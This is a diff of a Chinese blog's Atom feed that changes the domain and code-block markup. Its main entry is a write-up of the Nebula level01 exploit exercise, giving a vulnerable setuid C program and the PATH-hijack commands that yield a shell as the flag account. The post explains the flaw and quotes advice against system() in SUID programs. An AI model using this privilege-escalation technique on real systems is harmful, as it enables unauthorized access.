@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
   <title><![CDATA[categories: linux | Goorockey's Life]]></title>
-  <link href="http://goorockey.github.com/blog/categories/linux/atom.xml" rel="self"/>
-  <link href="http://goorockey.github.com/"/>
-  <updated>2012-11-01T12:51:35+08:00</updated>
-  <id>http://goorockey.github.com/</id>
+  <link href="http://www.goorockey.com/blog/categories/linux/atom.xml" rel="self"/>
+  <link href="http://www.goorockey.com/"/>
+  <updated>2012-11-02T13:10:09+08:00</updated>
+  <id>http://www.goorockey.com/</id>
   <author>
     <name><![CDATA[Goorockey]]></name>
     
@@ -15,50 +15,33 @@
   
   <entry>
     <title type="html"><![CDATA[关于exploit exercise nebula level01]]></title>
-    <link href="http://goorockey.github.com/blog/2012/10/10/about-exploit-exercise-nebula-level01/"/>
+    <link href="http://www.goorockey.com/blog/2012/10/10/about-exploit-exercise-nebula-level01/"/>
     <updated>2012-10-10T23:26:00+08:00</updated>
-    <id>http://goorockey.github.com/blog/2012/10/10/about-exploit-exercise-nebula-level01</id>
+    <id>http://www.goorockey.com/blog/2012/10/10/about-exploit-exercise-nebula-level01</id>
     <content type="html"><![CDATA[<p>今天做<a href="http://exploit-exercises.com/">exploit exercise</a>的nebula <a href="http://exploit-exercises.com/nebula/level01">level01</a>，长见识了，记录一下。</p>
 
 <h3 id="section">题目</h3>
 
 <p>题目提供了/home/flag01/下flag01的源码：</p>
 
-<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &amp;lt;sys/types.h&amp;gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h /&gt;&lt;/string.h&gt;&lt;/unistd.h&gt;&lt;/stdlib.h&gt;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>    <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-</span><span class='line'>    <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-</span><span class='line'><span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span> <span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
+<p>{% codeblock lang:c %}
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include &lt;sys/types.h&gt;
+#include <stdio.h /></string.h></unistd.h></stdlib.h></p>
+
+<p>int main(int argc, char **argv, char **envp)
+{
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();</p>
+
+<pre><code>setresgid(gid, gid, gid);
+setresuid(uid, uid, uid);
+
+system("/usr/bin/env echo and now what?"); } {% endcodeblock %}
 </code></pre>
 
 <p>flag01的权限：</p>
@@ -71,20 +54,15 @@
 
 <p><strong>解决方法</strong>网上都有：</p>
 
-<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ export PATH=/tmp:$PATH    # 把/tmp加到环境变量PATH的最前头
-</span><span class='line'>$ cat “/bin/bash” » /tmp/echo # 在/tmp创建一个echo文件，里面是执行bash
-</span><span class='line'>$ chmod +x /tmp/echo # 把/tmp/echo设为执行文件
-</span><span class='line'>$ /home/flag01/flag01 # 执行/home/flag01下的flag01&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;h1 id="flag01bash">顺利以用户flag01起bash&lt;/h1>
-</span><span class='line'>&lt;p>$ getflag # 通关</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+<p>{% codeblock %}
+$ export PATH=/tmp:$PATH    # 把/tmp加到环境变量PATH的最前头
+$ cat “/bin/bash” » /tmp/echo # 在/tmp创建一个echo文件，里面是执行bash
+$ chmod +x /tmp/echo # 把/tmp/echo设为执行文件
+$ /home/flag01/flag01 # 执行/home/flag01下的flag01</p>
+
+<h1 id="flag01bash">顺利以用户flag01起bash</h1>
+<p>$ getflag # 通关
+{% endcodeblock %}</p>
 
 <h3 id="section-1">原理</h3>
 
@@ -96,7 +74,12 @@
 
 <p>答案是不行的！在<a href="http://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code">stackoverflow</a>找到解答:</p>
 
-<p><blockquote><p>Note that the setting of real user ID, effective user ID and saved set-user-ID by a call to setresuid() before the call to system() in the vulnerable code posted in the question allows one to exploit the vulnerability even when only effective user ID is set to a privileged user ID and real user ID remains unprivileged (as is for example the case when relying on set-user-ID bit on a file as above). Without the call to setresuid() the shell run by system() would reset the effective user ID back to the real user ID making the exploit ineffective. However, in the case when the vulnerable code is run with real user ID of a privileged user, system() call alone is enough.</p></p><p><p>man page of sh:<br/>If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS variable, if it appears in the environment, is ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.</p></blockquote></p>
+<p>{% blockquote %}
+Note that the setting of real user ID, effective user ID and saved set-user-ID by a call to setresuid() before the call to system() in the vulnerable code posted in the question allows one to exploit the vulnerability even when only effective user ID is set to a privileged user ID and real user ID remains unprivileged (as is for example the case when relying on set-user-ID bit on a file as above). Without the call to setresuid() the shell run by system() would reset the effective user ID back to the real user ID making the exploit ineffective. However, in the case when the vulnerable code is run with real user ID of a privileged user, system() call alone is enough.</p>
+
+<p>man page of sh:
+If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS variable, if it appears in the environment, is ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.
+{% endblockquote %}</p>
 
 <h3 id="real-user-id-effective-user-idsaved-set-user-id-set-user-id-bit">real user ID, effective user ID，saved set-user-ID, set-user-ID bit</h3>
 
@@ -130,7 +113,9 @@
 
 <p>APUE也说了:</p>
 
-<p><blockquote><p>If it is running with special permissions–eithere set-user-ID or set-group-ID–and wants to spawn another process, a process should use fork() and exec() directly, being certain to change back to normal permissions after the fork(), before calling exec(). The system() function should never be used from a set-user-ID or a set-groupd-ID program.</p></blockquote></p>
+<p>{% blockquote %}
+If it is running with special permissions–eithere set-user-ID or set-group-ID–and wants to spawn another process, a process should use fork() and exec() directly, being certain to change back to normal permissions after the fork(), before calling exec(). The system() function should never be used from a set-user-ID or a set-groupd-ID program.
+{% endblockquote %}</p>
 
 <p>意思在SUID程序中，不应该用system()，而是自己写fork()和exec()来实现，并在fork和exec中间，自己处理好id权限问题。</p>
 
@@ -142,9 +127,9 @@
   
   <entry>
     <title type="html"><![CDATA[再次用linux做宿主系统]]></title>
-    <link href="http://goorockey.github.com/blogs/77180"/>
+    <link href="http://www.goorockey.com/blogs/77180"/>
     <updated>2012-02-29T00:00:00+08:00</updated>
-    <id>http://goorockey.github.com/blogs/77180</id>
+    <id>http://www.goorockey.com/blogs/77180</id>
     <content type="html"><![CDATA[<h3><strong>1、背景</strong></h3>
 <p>之前就试过几次想把linux作为宿主来玩，但都因为舍弃不了一些windows下的软件而放弃了，例如wiz，qq等都是我常用的软件。试过wine，但总是有点错误，不完美。</p>
 
@@ -236,9 +221,9 @@ $ sudo apt-get --purge remove network-manager-gnome</blockquote>
   
   <entry>
     <title type="html"><![CDATA[Apache和Tomcat]]></title>
-    <link href="http://goorockey.github.com/blogs/62001"/>
+    <link href="http://www.goorockey.com/blogs/62001"/>
     <updated>2011-11-22T00:00:00+08:00</updated>
-    <id>http://goorockey.github.com/blogs/62001</id>
+    <id>http://www.goorockey.com/blogs/62001</id>
     <content type="html"><![CDATA[<p>调研了一下Apache和Tomcat：</p>
 
 <p>1、apache 只是一个web服务器，负责响应客户端的请求。</p>
@@ -265,9 +250,9 @@ $ sudo apt-get --purge remove network-manager-gnome</blockquote>
   
   <entry>
     <title type="html"><![CDATA[CentOS下安装Apache+php+mysql Tomcat]]></title>
-    <link href="http://goorockey.github.com/blogs/60002"/>
+    <link href="http://www.goorockey.com/blogs/60002"/>
     <updated>2011-11-12T00:00:00+08:00</updated>
-    <id>http://goorockey.github.com/blogs/60002</id>
+    <id>http://www.goorockey.com/blogs/60002</id>
     <content type="html"><![CDATA[<p><strong><span style="color: #ff0000; font-size: medium;">一、安装及配置Apache+php+mysql</span></strong></p>
 
 <p><strong><span style="color: #9bbb59;">1、 安装Apache+php+mysql</span></strong></p>
@@ -444,9 +429,9 @@ chkconfig tomcat on</blockquote>
   
   <entry>
     <title type="html"><![CDATA[vim的统计功能]]></title>
-    <link href="http://goorockey.github.com/blogs/4012"/>
+    <link href="http://www.goorockey.com/blogs/4012"/>
     <updated>2011-05-19T00:00:00+08:00</updated>
-    <id>http://goorockey.github.com/blogs/4012</id>
+    <id>http://www.goorockey.com/blogs/4012</id>
     <content type="html"><![CDATA[<p> </p>
 
 <p><span style="font-size: medium;">(-_-)??今天遇到个问题：</span></p>
